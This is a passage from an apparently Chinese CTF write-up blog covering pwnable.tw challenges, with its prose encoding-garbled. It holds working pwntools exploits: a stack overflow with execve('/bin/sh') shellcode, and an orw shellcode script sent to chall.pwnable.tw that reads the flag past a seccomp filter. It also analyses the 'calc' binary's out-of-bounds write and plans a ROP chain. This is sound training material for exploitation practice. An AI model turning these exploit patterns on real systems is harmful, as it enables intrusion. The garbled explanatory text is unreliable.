class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(<span class="number">0x08048087</span>)</span><br><span class="line">sa(<span class="string">&quot;Let&#x27;s start the CTF:&quot;</span>,payload)</span><br><span class="line"></span><br><span class="line">leak_rsp = u32(p.recv(<span class="number">4</span>))</span><br><span class="line">success(<span class="built_in">hex</span>(leak_rsp))</span><br><span class="line"></span><br><span class="line">shellcode = asm(<span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">push %s</span></span><br><span class="line"><span class="string">push esp</span></span><br><span class="line"><span class="string">pop ebx</span></span><br><span class="line"><span class="string">xor ecx,ecx</span></span><br><span class="line"><span class="string">xor edx,edx</span></span><br><span class="line"><span class="string">push 0xb</span></span><br><span class="line"><span class="string">pop eax</span></span><br><span class="line"><span class="string">int 0x80</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span> % (u32(<span class="string">&#x27;/sh\0&#x27;</span>) , u32(<span class="string">&#x27;/bin&#x27;</span>)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x14</span> + p32(leak_rsp + <span class="number">0x14</span>) + shellcode</span><br><span class="line">s(payload)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="orw"><a href="#orw" class="headerlink" title="orw"></a>orw</h2><p>ç¨‹åºé€»è¾‘æ˜¯ï¼Œè¾“å…¥ 0xC8 ä¸ªå­—èŠ‚çš„æ•°æ®ï¼Œç„¶åcallè¿™ä¸ªæ•°æ®</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">; Attributes: bp-based frame fuzzy-sp</span><br><span class="line"></span><br><span class="line">; int __cdecl main(int argc, const char **argv, const char **envp)</span><br><span class="line">public main</span><br><span class="line">main proc near</span><br><span class="line"></span><br><span class="line">var_4= dword ptr -4</span><br><span class="line">argc= dword ptr  8</span><br><span class="line">argv= dword ptr  0Ch</span><br><span class="line">envp= dword ptr  10h</span><br><span class="line"></span><br><span class="line">; __unwind &#123;</span><br><span class="line">lea     ecx, [esp+4]</span><br><span class="line">and     esp, 0FFFFFFF0h</span><br><span class="line">push    dword ptr [ecx-4]</span><br><span class="line">push    ebp</span><br><span class="line">mov     ebp, esp</span><br><span class="line">push    ecx</span><br><span class="line">sub     esp, 4</span><br><span class="line">call    orw_seccomp</span><br><span class="line">sub     esp, 0Ch</span><br><span class="line">push    offset format   ; &quot;Give my your shellcode:&quot;</span><br><span class="line">call    _printf</span><br><span class="line">add     esp, 10h</span><br><span class="line">sub     esp, 4</span><br><span class="line">push    0C8h            ; nbytes</span><br><span class="line">push    offset shellcode ; buf</span><br><span class="line">push    0               ; fd</span><br><span class="line">call    _read</span><br><span class="line">add     esp, 10h</span><br><span class="line">mov     eax, offset shellcode</span><br><span class="line">call    eax ; shellcode</span><br><span class="line">mov     eax, 0</span><br><span class="line">mov     ecx, [ebp+var_4]</span><br><span class="line">leave</span><br><span class="line">lea     esp, [ecx-4]</span><br><span class="line">retn</span><br><span class="line">; &#125; // starts at 8048548</span><br><span class="line">main endp</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>è¾“å…¥å‰æœ‰ä¸€ä¸ªæ²™ç®±ï¼Œå¯ä»¥é€šè¿‡orw(open read write)æŠŠflagè¯»å‡ºæ¥ï¼Œä¸è¿‡è¿™é‡Œ å¦‚æœ A ä¸º 64ä½çš„è¯ï¼Œä¼¼ä¹ä¹Ÿèƒ½ç»•è¿‡æ²™ç®±ï¼Œå¥½åƒå¯ä»¥é€šè¿‡retnå»ä¿®æ”¹æ®µå¯„å­˜å™¨çš„æŸä¸ªæ•°æ®æ¥åˆ‡æ¢å¤„ç†å™¨çš„è¿è¡Œæ¨¡å¼ï¼Œä¸è¿‡æˆ‘æ˜¯ç›´æ¥ç”¨shellcraftæ¥ç”ŸæˆorwæŠŠflagè¯»å‡ºæ¥çš„</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">lhj@lhj-virtual-machine:~/Desktop/pwntw/orw$ seccomp-tools dump ./orw</span><br><span class="line"> line  CODE  JT   JF      K</span><br><span class="line">=================================</span><br><span class="line"> 0000: 0x20 0x00 0x00 0x00000004  A = arch</span><br><span class="line"> 0001: 0x15 0x00 0x09 0x40000003  if (A != ARCH_I386) goto 0011</span><br><span class="line"> 0002: 0x20 0x00 0x00 0x00000000  A = sys_number</span><br><span class="line"> 0003: 0x15 0x07 0x00 0x000000ad  if (A == rt_sigreturn) goto 0011</span><br><span class="line"> 0004: 0x15 0x06 0x00 0x00000077  if (A == sigreturn) goto 0011</span><br><span class="line"> 0005: 0x15 0x05 0x00 0x000000fc  if (A == exit_group) goto 0011</span><br><span class="line"> 0006: 0x15 0x04 0x00 0x00000001  if (A == exit) goto 0011</span><br><span class="line"> 0007: 0x15 0x03 0x00 0x00000005  if (A == open) goto 0011</span><br><span class="line"> 0008: 0x15 0x02 0x00 0x00000003  if (A == read) goto 0011</span><br><span class="line"> 0009: 0x15 0x01 0x00 0x00000004  if (A == write) goto 0011</span><br><span class="line"> 0010: 0x06 0x00 0x00 0x00050026  return ERRNO(38)</span><br><span class="line"> 0011: 0x06 0x00 0x00 0x7fff0000  return ALLOW</span><br></pre></td></tr></table></figure>

<p>exp</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment"># from LibcSearcher import *</span></span><br><span class="line"></span><br><span class="line">context(os=<span class="string">&#x27;linux&#x27;</span>,arch=<span class="string">&#x27;i386&#x27;</span>,log_level=<span class="string">&#x27;debug&#x27;</span>)</span><br><span class="line">elf = context.binary = ELF(<span class="string">&#x27;./orw&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">is_debug = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(is_debug):</span><br><span class="line">    p = process()</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    ip = <span class="string">&quot;chall.pwnable.tw&quot;</span></span><br><span class="line">    port = <span class="number">10001</span></span><br><span class="line">    p = remote(ip,port)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">g = <span class="keyword">lambda</span> x: gdb.attach(x)</span><br><span class="line"></span><br><span class="line"><span class="comment"># send() sendline() sendafter() sendlineafter()</span></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x,y: p.sendafter(x,y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x,y: p.sendlineafter(x,y)</span><br><span class="line"></span><br><span class="line"><span class="comment"># recv() recvline() recvuntil()</span></span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> : p.recvline()</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_i386</span>():</span><br><span class="line">    shellcode = shellcraft.<span class="built_in">open</span>(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">    shellcode += shellcraft.read(<span class="string">&#x27;eax&#x27;</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">    shellcode += shellcraft.write(<span class="number">1</span>,<span class="string">&#x27;esp&#x27;</span>,<span class="number">0x30</span>)</span><br><span class="line">    <span class="keyword">return</span> asm(shellcode)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">orw_cat_i386</span>():</span><br><span class="line">    shellcode = shellcraft.i386.linux.cat2(<span class="string">&#x27;/home/orw/flag&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> asm(shellcode)</span><br><span class="line"></span><br><span class="line">shellcode = orw_cat_i386()</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(shellcode))</span><br><span class="line"></span><br><span class="line"><span class="comment"># g(p)</span></span><br><span class="line">s(shellcode)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>



<h2 id="calc"><a href="#calc" class="headerlink" title="calc"></a>calc</h2><p>å…ˆåˆ†æä¸€ä¸‹ç¨‹åºçš„åŠŸèƒ½ï¼Œget_expræ˜¯è¾“å…¥(æœ€å¤šä½1024å­—èŠ‚çš„æ•°æ®)ï¼Œparse_exprä¼šæŠŠè¾“å…¥çš„è¡¨è¾¾å¼è®¡ç®—å‡ºæ¥ï¼Œæœ€åæ‰“å°ç»“æœã€‚bzeroå’Œinit_poolè¿™ä¸¤ä¸ªå‡½æ•°ä¸å¤ªé‡è¦ï¼Œåªæ˜¯åˆå§‹åŒ–çš„å‡½æ•°</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">unsigned</span> <span class="type">int</span> <span class="title function_">calc</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> pool[<span class="number">101</span>]; <span class="comment">// [esp+18h] [ebp-5A0h] BYREF</span></span><br><span class="line">  <span class="type">char</span> s[<span class="number">1024</span>]; <span class="comment">// [esp+1ACh] [ebp-40Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// [esp+5ACh] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v3 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    bzero(s, <span class="number">0x400</span>u);</span><br><span class="line">    <span class="keyword">if</span> ( !get_expr(s, <span class="number">1024</span>) )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    init_pool(pool);</span><br><span class="line">    <span class="keyword">if</span> ( parse_expr((<span class="type">int</span>)s, pool) )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;%d\n&quot;</span>, pool[pool[<span class="number">0</span>]]);</span><br><span class="line">      fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> __readgsdword(<span class="number">0x14</span>u) ^ v3;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¿™é‡Œå¯¹è¾“å…¥æœ‰ä¸€äº›å­—ç¬¦é™åˆ¶ï¼Œæ»¡è¶³çº¦æŸæ‰èƒ½æŠŠæ•°æ®è¯»è¿›å»</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">get_expr</span><span class="params">(<span class="type">int</span> a1, <span class="type">int</span> a2)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">char</span> v4; <span class="comment">// [esp+1Bh] [ebp-Dh] BYREF</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( v5 &lt; a2 &amp;&amp; read(<span class="number">0</span>, &amp;v4, <span class="number">1</span>) != <span class="number">-1</span> &amp;&amp; v4 != <span class="number">10</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">43</span> || v4 == <span class="number">45</span> || v4 == <span class="number">42</span> || v4 == <span class="number">47</span> || v4 == <span class="number">37</span> || v4 &gt; <span class="number">47</span> &amp;&amp; v4 &lt;= <span class="number">57</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v2 = v5++;</span><br><span class="line">      *(_BYTE *)(a1 + v2) = v4;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  *(_BYTE *)(v5 + a1) = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[37, 42, 43, 45, 47, 48, 49, 50, 51, 52, 53, 54, 55, 56, 57]</span><br><span class="line">%*+-/0123456789</span><br></pre></td></tr></table></figure>

<p>parse_exprä¸­ï¼Œä¼šé€šè¿‡æŸ¥æ‰¾è¿ç®—ç¬¦ä½ç½®çš„æ–¹å¼ï¼Œæ¥åˆ’åˆ†è¡¨è¾¾å¼ä¸­çš„æ“ä½œæ•° è¿ç®—ç¬¦ï¼Œåˆ†åˆ«å­˜å‚¨åˆ°ä¸¤ä¸ªæ•°ç»„ä¸­ï¼Œæœ€åä¸¢åˆ°evalé‡Œè®¡ç®—ç»“æœ</p>
<p>æ»¡è¶³çº¦æŸçš„è¿ç®—ç¬¦çš„asciiæ˜¯ &lt; 48çš„ï¼Œè¿™é‡Œåšäº†ä¸€ä¸ªæ— ç¬¦å·çš„ç±»å‹è½¬æ¢ è´Ÿæ•°è½¬u32_intçš„å€¼æ˜¯ &gt; 9çš„ï¼Œæ‰€ä»¥è¿™æ®µä»£ç ä½œç”¨æ˜¯ åˆ¤æ–­æ˜¯å¦æ˜¯ä¸€ä¸ªè¿ç®—ç¬¦(ç¬¬ä¸€æ¬¡çœ‹æ„Ÿè§‰å¾ˆå¥‡æ€ª)</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(unsigned int)(*(char *)(i + inputString) - 48) &gt; 9 )</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl <span class="title function_">parse_expr</span><span class="params">(<span class="type">int</span> inputString, _DWORD *pool)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [esp+20h] [ebp-88h]</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [esp+24h] [ebp-84h]</span></span><br><span class="line">  <span class="type">int</span> v6; <span class="comment">// [esp+28h] [ebp-80h]</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp+2Ch] [ebp-7Ch]</span></span><br><span class="line">  <span class="type">char</span> *s1; <span class="comment">// [esp+30h] [ebp-78h]</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// [esp+34h] [ebp-74h]</span></span><br><span class="line">  <span class="type">char</span> operator[<span class="number">100</span>]; <span class="comment">// [esp+38h] [ebp-70h] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v11; <span class="comment">// [esp+9Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v11 = __readgsdword(<span class="number">0x14</span>u);</span><br><span class="line">  v4 = inputString;</span><br><span class="line">  v6 = <span class="number">0</span>;</span><br><span class="line">  bzero(operator, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; ; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + inputString) - <span class="number">48</span>) &gt; <span class="number">9</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      v7 = i + inputString - v4;</span><br><span class="line">      s1 = (<span class="type">char</span> *)<span class="built_in">malloc</span>(v7 + <span class="number">1</span>);</span><br><span class="line">      <span class="built_in">memcpy</span>(s1, v4, v7);</span><br><span class="line">      s1[v7] = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">if</span> ( !<span class="built_in">strcmp</span>(s1, <span class="string">&quot;0&quot;</span>) )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;prevent division by zero&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v9 = atoi(s1);</span><br><span class="line">      <span class="keyword">if</span> ( v9 &gt; <span class="number">0</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        v3 = (*pool)++;</span><br><span class="line">        pool[v3 + <span class="number">1</span>] = v9;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(i + inputString) &amp;&amp; (<span class="type">unsigned</span> <span class="type">int</span>)(*(<span class="type">char</span> *)(i + <span class="number">1</span> + inputString) - <span class="number">48</span>) &gt; <span class="number">9</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;expression error!&quot;</span>);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      v4 = i + <span class="number">1</span> + inputString;</span><br><span class="line">      <span class="keyword">if</span> ( operator[v6] )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="keyword">switch</span> ( *(_BYTE *)(i + inputString) )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;%&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;*&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;/&#x27;</span>:</span><br><span class="line">            <span class="keyword">if</span> ( operator[v6] != <span class="number">43</span> &amp;&amp; operator[v6] != <span class="number">45</span> )</span><br><span class="line">              <span class="keyword">goto</span> LABEL_14;</span><br><span class="line">            operator[++v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;+&#x27;</span>:</span><br><span class="line">          <span class="keyword">case</span> <span class="string">&#x27;-&#x27;</span>:</span><br><span class="line">LABEL_14:</span><br><span class="line">            eval(pool, operator[v6]);</span><br><span class="line">            operator[v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">          <span class="keyword">default</span>:</span><br><span class="line">            eval(pool, operator[v6--]);</span><br><span class="line">            <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">      &#123;</span><br><span class="line">        operator[v6] = *(_BYTE *)(i + inputString);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">if</span> ( !*(_BYTE *)(i + inputString) )</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( v6 &gt;= <span class="number">0</span> )</span><br><span class="line">    eval(pool, operator[v6--]);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>æ¼æ´ç‚¹å‡ºæ¥evalå‡½æ•°ä¸­ï¼Œä»è¿™é‡Œå¯ä»¥å‘ç° pool[0]æ˜¯å­˜å‚¨poolä¸­æœ‰å¤šå°‘ä¸ªæ“ä½œæ•°ï¼Œé€šè¿‡pool[0] è®¡ç®—ä¸‹æ ‡å–ä¸¤ä¸ªæ“ä½œæ•°çš„ä½ç½®ï¼Œè¿˜æœ‰è®¡ç®—ç»“æœå­˜æ”¾çš„ä½ç½®ã€‚</p>
<p>å¦‚æœè¡¨è¾¾å¼ä¸º + 10çš„è¯ï¼Œè¿™ä¸ªè¡¨è¾¾å¼ä¼šå˜æˆ pool[1  - 1] +&#x3D; pool[1]ï¼Œä¹Ÿå°±æ˜¯èƒ½è¦†ç›–pool[0]ã€‚ç”±äºevalè®¡ç®—è¡¨è¾¾å¼æ˜¯é€šè¿‡pool[0]æ¥è®¡ç®—å­˜å‚¨ç»“æœçš„ä½ç½®ï¼Œä¹Ÿå°±æ˜¯è¯´èƒ½æ§åˆ¶pool[0] å°±èƒ½å¾€ä»»æ„åœ°å€å†™å…¥ è¡¨è¾¾å¼çš„ç»“æœï¼Œå®ç°ä¸€ä¸ªä»»æ„åœ°å€å€¼å†™</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pool[*pool - 1] += pool[*pool];</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">_DWORD *__cdecl eval(_DWORD *pool, char a2)</span><br><span class="line">&#123;</span><br><span class="line">  _DWORD *result; // eax</span><br><span class="line"></span><br><span class="line">  if ( a2 == 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - 1] += pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 &gt; 43 )</span><br><span class="line">  &#123;</span><br><span class="line">    if ( a2 == 45 )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - 1] -= pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">    else if ( a2 == 47 )</span><br><span class="line">    &#123;</span><br><span class="line">      pool[*pool - 1] /= (int)pool[*pool];</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  else if ( a2 == 42 )</span><br><span class="line">  &#123;</span><br><span class="line">    pool[*pool - 1] *= pool[*pool];</span><br><span class="line">  &#125;</span><br><span class="line">  result = pool;</span><br><span class="line">  --*pool;</span><br><span class="line">  return result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>é™¤äº†ä»»æ„åœ°å€å†™å¤–ï¼Œprintfè¿™é‡Œæ˜¯é€šè¿‡ poolä½œä¸ºåŸºåœ°å€ï¼Œåç§»pool[0]æ¥å–æ•°æ®æ‰“å°çš„ï¼Œè¿™æ„å‘³ç€è¿™é‡Œèƒ½æ³„éœ²ä»»æ„åœ°å€</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">if ( parse_expr((int)s, pool) )</span><br><span class="line">&#123;</span><br><span class="line">  printf(&quot;%d\n&quot;, pool[pool[0]]);</span><br><span class="line">  fflush(stdout);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>åˆ©ç”¨æ€è·¯æ˜¯ï¼Œé€šè¿‡ropgadgetç”Ÿæˆä¸€ä¸ªropé“¾ï¼Œå¾€è¿”å›åœ°å€å†™è¿™ä¸ªropé“¾ï¼Œå…ˆæ³„éœ²è¦å†™çš„ä½ç½®çš„æ•°æ®ï¼Œç„¶åé€šè¿‡subå’Œaddæ¸…ç©ºè¿™ä¸ªä½ç½®çš„æ•°æ®ï¼Œæœ€åæŠŠropé“¾ addä¸Šå»ã€‚</p>
<p>è¿™ä¸ªpoolè·ç¦» rbpçš„ä½ç½®æ˜¯ 0x5a0ä¸ªå­—èŠ‚ï¼Œ32ä½ç¨‹åºè¿”å›åœ°å€åœ¨rbp + 4ä¸Šã€‚poolæ˜¯int32ç±»å‹çš„ï¼Œæ‰€ä»¥åç§»ä¸º (0x5a0 + 4) &#x2F; 4 &#x3D; 361</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int pool[101]; // [esp+18h] [ebp-5A0h] BYREF</span><br></pre></td></tr></table></figure>

